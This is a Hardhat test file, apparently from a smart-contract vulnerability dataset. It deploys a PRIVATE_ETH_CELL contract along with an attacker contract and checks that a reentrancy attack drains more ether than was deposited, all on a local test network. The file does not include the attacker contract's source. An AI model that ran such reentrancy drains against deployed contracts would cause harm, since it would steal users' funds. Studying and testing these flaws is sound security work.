const { expect } = require("chai");
const { ethers } = require("hardhat");
describe("Reentrancy Attack for 0x4e73b32ed6c35f570686b89848e5f39f20ecc106.sol", function () {
  let PrivateETHCell;
  let victim;
  let MaliciousContract;
  let hacker;
  let Log;
  let log;

  beforeEach(async function () {
    // Deploy LogFile contract
    Log = await ethers.getContractFactory("contracts/dataset/reentrancy/0x4e73b32ed6c35f570686b89848e5f39f20ecc106.sol:LogFile");
    log = await Log.deploy();
    await log.waitForDeployment();

    // Deploy PrivateETHCell contract with LogFile address
    PrivateETHCell = await ethers.getContractFactory("contracts/dataset/reentrancy/0x4e73b32ed6c35f570686b89848e5f39f20ecc106.sol:PRIVATE_ETH_CELL");
    victim = await PrivateETHCell.deploy();
    await victim.waitForDeployment();
    await victim.SetLogFile(log.target); // Set LogFile address after deployment

    // Deploy MaliciousContract with victim address
    MaliciousContract = await ethers.getContractFactory("contracts/reentrancy/0x4e73b32ed6c35f570686b89848e5f39f20ecc106_attack.sol:MaliciousContract");
    hacker = await MaliciousContract.deploy(victim.target);
  });

  it("should successfully drain funds through reentrancy attack", async function () {
    // Initial deposit to victim contract
    await victim.Deposit({ value: ethers.parseEther("5") });
    // verify correct deposit
    const initialBalance = await ethers.provider.getBalance(victim.target);
    expect(initialBalance).to.equal(ethers.parseEther("5")); 


    // Initial deposit from hacker on victim contract
    await hacker.deposit({value:  ethers.parseEther("2")});

    const privateBalanceAfterMaliciousDeposit = await ethers.provider.getBalance(victim.target);
    expect(privateBalanceAfterMaliciousDeposit).to.equal(ethers.parseEther("7")); 

    // we set the hackers balance to 0
    await network.provider.send("hardhat_setBalance", [
      hacker.target,
      "0x0",
    ]);
    let hackerBalanceBeforeAttack = await ethers.provider.getBalance(hacker.target);
    expect(hackerBalanceBeforeAttack).to.equal(0);



    // Perform reentrancy attack through hacker
    await hacker.attack(ethers.parseEther("2"));

    // Verify the attack was successful

    // Check balances after attack
    const personalBankBalance = await ethers.provider.getBalance(victim.target);
    const hackerBalance = await ethers.provider.getBalance(hacker.target);
    
    // victim has lost more than the 2 ethers from withdraw
    expect(personalBankBalance).to.be.below(ethers.parseEther("5")); 

    //hacker has more than the withdrawn amount
    expect(hackerBalance).to.be.above(ethers.parseEther("2"));
  });
});
